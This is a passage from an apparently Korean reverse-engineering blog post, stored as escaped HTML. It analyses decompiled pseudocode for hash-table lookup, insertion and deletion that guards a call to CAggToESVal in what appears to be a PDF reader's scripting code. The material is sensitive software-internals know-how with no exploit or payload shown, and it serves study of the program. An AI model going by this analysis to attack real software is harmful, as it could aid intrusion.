&amp;#xACBD;&amp;#xC6B0; &amp;#xD574;&amp;#xB2F9; &amp;#xBC84;&amp;#xD0B7;&amp;#xC740; &amp;#xBE44;&amp;#xC5B4;&amp;#xC788;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC774;&amp;#xAE30;&amp;#xC5D0; &amp;#xD0D0;&amp;#xC0C9;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xBC84;&amp;#xD0B7;&amp;#xC774; &amp;#xBE44;&amp;#xC5B4;&amp;#xC788;&amp;#xC9C0; &amp;#xC54A;&amp;#xB2E4;&amp;#xBA74; &amp;#xD0D0;&amp;#xC0C9; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xB41C; &lt;code&gt;returnPtr&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB97C; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt; &amp;#xBC84;&amp;#xD0B7;&amp;#xC774; &amp;#xBE44;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xB098; &amp;#xBC84;&amp;#xD0B7;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;, &lt;code&gt;returnPtr-&amp;gt;Flink&lt;/code&gt;&amp;#xC640; &lt;code&gt;returnPtr-&amp;gt;Blink&lt;/code&gt;&amp;#xC5D0; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;NULL&lt;/code&gt;&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xACE0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xCC3E;&amp;#xC740; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &amp;#xD574;&amp;#xB2F9; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xC788;&amp;#xB294; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &lt;code&gt;Flink&lt;/code&gt;&amp;#xC640; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xAC00; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;returnPtr-&amp;gt;Flink&lt;/code&gt;&amp;#xC640; &lt;code&gt;returnPtr-&amp;gt;Blink&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xBC18;&amp;#xD658;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sub_20AD638B&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;FindDataFromHashTable&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD0D0;&amp;#xC0C9; &amp;#xACB0;&amp;#xACFC;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xB41C; &lt;code&gt;returnPtr&lt;/code&gt;&amp;#xC758; &lt;code&gt;Blink&lt;/code&gt;&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xC5EC; &amp;#xC774; &amp;#xAC12;&amp;#xC774; &lt;code&gt;NULL&lt;/code&gt;&amp;#xC778;(HashTable&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294;) &amp;#xACBD;&amp;#xC6B0; &amp;#xB450; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790; &lt;code&gt;a2&lt;/code&gt;&amp;#xC758; &lt;code&gt;Flink&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;hashTable-&amp;gt;DefaultHead&lt;/code&gt;&amp;#xB97C; &amp;#xC800;&amp;#xC7A5;&amp;#xD558;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;v5 = FindDataFromHashTable(hashTable, &amp;amp;returnPtr, pData, DataHash)-&amp;gt;Blink;
&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v5 )
  v5 = hashTable-&amp;gt;DefaultHead;
result = a2;
a2-&amp;gt;Flink = v5;                              
&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xCD5C;&amp;#xC885;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;IsDataInGlobalHashTable&lt;/code&gt; &amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;Data&lt;/code&gt;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xB294; &amp;#xB178;&amp;#xB4DC;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB098; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xB294; &lt;code&gt;GlobalHashTable.DefaultHead&lt;/code&gt;&amp;#xB97C; &lt;code&gt;GlobalHashTable.DefaultHead&lt;/code&gt;&amp;#xC640; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xACE0; &amp;#xC774; &amp;#xACB0;&amp;#xACFC;&amp;#xB97C; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Data &amp;amp;&amp;amp; sub_20AD638B(&amp;amp;GlobalHashTable, (ListEntry *)&amp;amp;a2, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;Data)-&amp;gt;Flink != GlobalHashTable.DefaultHead;
&lt;span class=&#34;hljs-comment&#34;&gt;//if Data is in GlobalHashTable, then Node&amp;apos;s Addr != GlobalHashTable.&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;//=&amp;gt; return true&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;//else return false&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB530;&amp;#xB77C;&amp;#xC11C; &lt;code&gt;GetRichValueEventProp&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xC774; &lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB9CC; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &amp;#xBD84;&amp;#xAE30;&amp;#xB85C; &amp;#xC9C4;&amp;#xC785;&amp;#xD558;&amp;#xAC8C; &amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( PointerType )
{
  LOBYTE(PointerType) = IsDataInGlobalHashTable(PointerType);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !(_BYTE)PointerType )
  {
    v15 = InsertToGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31, PointerType_1);
    LOBYTE(v33) = &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
    CAggToESVal((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)v15, v16, PropName, PointerType_1);
    PointerType = DeleteFromGlobalHashTable((&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v31);
  }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294; &lt;code&gt;CAggToESVal&lt;/code&gt; &amp;#xC774;&amp;#xC804;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;InsertToGlobalHashTable&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xBD84;&amp;#xC11D;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;InsertToGlobalHashTable&#34;&gt;&lt;a href=&#34;#InsertToGlobalHashTable&#34; class=&#34;headerlink&#34; title=&#34;InsertToGlobalHashTable&#34;&gt;&lt;/a&gt;InsertToGlobalHashTable&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;_DWORD *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;InsertToGlobalHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a1, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Data)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v4[&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+4h] [ebp-8h] BYREF&lt;/span&gt;

  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( Data )
  {
    InsertIfNotPresent(&amp;amp;GlobalHashTable, (ListEntry *)v4, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;Data)-&amp;gt;Flink-&amp;gt;field_C = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
    *(_DWORD *)a1 = Data;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; (_DWORD *)a1;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xACFC; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xCD94;&amp;#xAC00;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;InsertIfNotPresent&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xBA74; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790; &lt;code&gt;a1&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &lt;code&gt;Data&lt;/code&gt;&amp;#xB97C; &amp;#xC4F0;&amp;#xACE0; &amp;#xBC18;&amp;#xD658;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;InsertIfNotPresent&#34;&gt;&lt;a href=&#34;#InsertIfNotPresent&#34; class=&#34;headerlink&#34; title=&#34;InsertIfNotPresent&#34;&gt;&lt;/a&gt;InsertIfNotPresent&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;ListEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;InsertIfNotPresent&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, ListEntry *a2, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; *pData)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash; &lt;span class=&#34;hljs-comment&#34;&gt;// ebx&lt;/span&gt;
  ListEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  HashBucketEntry *newBucketEntry; &lt;span class=&#34;hljs-comment&#34;&gt;// edi&lt;/span&gt;
  HashBucketEntry *BucketHead; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  HashBucketEntry *v8; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; v9; &lt;span class=&#34;hljs-comment&#34;&gt;// zf&lt;/span&gt;
  ListEntry findResult; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+10h] [ebp-24h] BYREF&lt;/span&gt;
  HashBucketEntry v11; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+18h] [ebp-1Ch] BYREF&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v12; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+30h] [ebp-4h]&lt;/span&gt;

  DataHash = hashFunction(&lt;span class=&#34;hljs-number&#34;&gt;0x811C9DC5&lt;/span&gt;, pData, &lt;span class=&#34;hljs-number&#34;&gt;4u&lt;/span&gt;);
  FindDataFromHashTable(hashTable, &amp;amp;findResult, pData, DataHash);
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( findResult.Blink )                       &lt;span class=&#34;hljs-comment&#34;&gt;// Data is present in HashTable, no insertion&lt;/span&gt;
  {
    result = a2;
    a2-&amp;gt;Flink = findResult.Blink;
    LOBYTE(a2-&amp;gt;Blink) = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;                                          &lt;span class=&#34;hljs-comment&#34;&gt;// Data is not present -&amp;gt; insertion occurs&lt;/span&gt;
  {
    hashTableLengthCheck(hashTable);
    v11.Data = (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)pData;
    AllocateNewNode(&amp;amp;v11, (HashBucketEntry *)&amp;amp;hashTable-&amp;gt;DefaultHead, &amp;amp;dword_2100AE5C, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;v11.Data);&lt;span class=&#34;hljs-comment&#34;&gt;// allocate new node&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// v11.list_entry.list_entry.blink = new_node&lt;/span&gt;
    v12 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( IsBucketExpandNeeded(hashTable) )
    {
      expandHashTable(hashTable);
      newBucketEntry = v11.list_entry.list_entry.Blink;
      BucketHead = FindDataFromHashTable(hashTable, &amp;amp;findResult, &amp;amp;v11.list_entry.list_entry.Blink-&amp;gt;Data, DataHash)-&amp;gt;Flink;
    }
    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
    {
      BucketHead = findResult.Flink;
      newBucketEntry = v11.list_entry.list_entry.Blink;
    }
    v11.list_entry.list_entry.Blink = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    v8 = InsertIntoHashTable(hashTable, DataHash, BucketHead, newBucketEntry);
    v9 = v11.list_entry.list_entry.Blink == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    a2-&amp;gt;Flink = v8;
    LOBYTE(a2-&amp;gt;Blink) = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v9 )
      sub_20867B89(v11.list_entry.list_entry.Blink);
    result = a2;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;hashFunction&lt;/code&gt;&amp;#xACFC; &lt;code&gt;FindDataFromHashTable&lt;/code&gt;&amp;#xB85C; &amp;#xBA3C;&amp;#xC800; &amp;#xC0BD;&amp;#xC785;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xBBF8; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;findResult.Blink&lt;/code&gt;&amp;#xAC00; &lt;code&gt;NULL&lt;/code&gt;&amp;#xC774; &amp;#xC544;&amp;#xB2CC; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xC124;&amp;#xC815;&amp;#xB418;&amp;#xAE30;&amp;#xC5D0; &lt;code&gt;if&lt;/code&gt;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xC5EC; &amp;#xC0BD;&amp;#xC785; &amp;#xACFC;&amp;#xC815; &amp;#xC5C6;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xBC18;&amp;#xD658;&amp;#xB418;&amp;#xACE0; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &amp;#xC0BD;&amp;#xC785;&amp;#xD560; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC5C6;&amp;#xB294; &amp;#xACBD;&amp;#xC6B0; &lt;code&gt;else&lt;/code&gt;&amp;#xB85C; &amp;#xBD84;&amp;#xAE30;&amp;#xD558;&amp;#xC5EC; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC758; &amp;#xC0BD;&amp;#xC785;&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9D1;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;else&lt;/code&gt; &amp;#xBD84;&amp;#xAE30;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;AllocateNewNode&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC5B4; &lt;code&gt;Data&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;*pData&lt;/code&gt;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xC0C8;&amp;#xB85C;&amp;#xC6B4; &amp;#xB178;&amp;#xB4DC;&amp;#xAC00; &amp;#xD560;&amp;#xB2F9;&amp;#xB418;&amp;#xACE0; &lt;code&gt;findResult.Flink&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC0BD;&amp;#xC785;&amp;#xB420; &amp;#xBC84;&amp;#xD0B7;&amp;#xC758; &lt;code&gt;Head&lt;/code&gt;&amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &amp;#xD560;&amp;#xB2F9;&amp;#xB41C; &amp;#xB178;&amp;#xB4DC;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &lt;code&gt;InsertIntoHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;InsertIntoHashTable&#34;&gt;&lt;a href=&#34;#InsertIntoHashTable&#34; class=&#34;headerlink&#34; title=&#34;InsertIntoHashTable&#34;&gt;&lt;/a&gt;InsertIntoHashTable&lt;/h3&gt;&lt;p&gt;&lt;code&gt;InsertIntoHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;target-&amp;gt;Blink&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;newNode&lt;/code&gt;&amp;#xB97C; &amp;#xC0BD;&amp;#xC785;&amp;#xD558;&amp;#xB294; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;HashBucketEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;InsertIntoHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash, HashBucketEntry *target, HashBucketEntry *newNode)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  HashBucketEntry *tmp; &lt;span class=&#34;hljs-comment&#34;&gt;// ebx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  HashBucketEntryHeader *v6; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;
  HashBucketEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  tmp = target-&amp;gt;list_entry.list_entry.Blink;
  ++hashTable-&amp;gt;length;                          &lt;span class=&#34;hljs-comment&#34;&gt;// Increase Length&lt;/span&gt;
  newNode-&amp;gt;list_entry.list_entry.Flink = target;
  newNode-&amp;gt;list_entry.list_entry.Blink = tmp;
  tmp-&amp;gt;list_entry.list_entry.Flink = newNode;
  target-&amp;gt;list_entry.list_entry.Blink = newNode;&lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// Blink: &amp;lt;-&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// Flink: -&amp;gt;&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// Before Insertion&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// ... &amp;lt;-&amp;gt; tmp &amp;lt;-&amp;gt; target &amp;lt;-&amp;gt; ...&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;// After Insertion&lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;//  &lt;/span&gt;
  &lt;span class=&#34;hljs-comment&#34;&gt;//  ... &amp;lt;-&amp;gt; tmp &amp;lt;-&amp;gt; newNode &amp;lt;-&amp;gt; target &amp;lt;-&amp;gt; ...&lt;/span&gt;
  idx = DataHash &amp;amp; hashTable-&amp;gt;HashBuckets.BucketMaxIndex;
  v6 = hashTable-&amp;gt;HashBuckets.HashBucketBegin;
  result = newNode;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v6[idx].BucketHead == hashTable-&amp;gt;DefaultHead )
  {
    v6[idx].BucketHead = newNode;
LABEL_6:
    v6[idx].BucketTail = newNode;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v6[idx].BucketHead == target )
  {
    v6[idx].BucketHead = newNode;
    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v6[idx].BucketTail == tmp )
    &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_6;
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xC0BD;&amp;#xC785;&amp;#xC73C;&amp;#xB85C; &amp;#xC778;&amp;#xD574; &amp;#xBC84;&amp;#xD0B7;&amp;#xC758;  Head&amp;#xB098; Tail&amp;#xC774; &amp;#xBC14;&amp;#xB010; &amp;#xACBD;&amp;#xC6B0;, &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &lt;code&gt;HashBucketEntryHeader&lt;/code&gt;&amp;#xC758; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xB098; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC744; &amp;#xBCC0;&amp;#xACBD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC704; &amp;#xACFC;&amp;#xC815;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC5D0; &lt;code&gt;PointerType&lt;/code&gt;&amp;#xC758; &amp;#xC0BD;&amp;#xC785;&amp;#xC774; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;CAggToESVal&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xACE0; &amp;#xC774;&amp;#xD6C4; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;DeleteFromGlobalHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;DeleteGlobalFromHashTable&#34;&gt;&lt;a href=&#34;#DeleteGlobalFromHashTable&#34; class=&#34;headerlink&#34; title=&#34;DeleteGlobalFromHashTable&#34;&gt;&lt;/a&gt;DeleteGlobalFromHashTable&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __thiscall &lt;span class=&#34;hljs-title&#34;&gt;DeleteFromGlobalHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(_DWORD *pData)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *pData )                                 
  {
    result = DeleteFromHashTable(&amp;amp;GlobalHashTable, pData);
    *pData = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
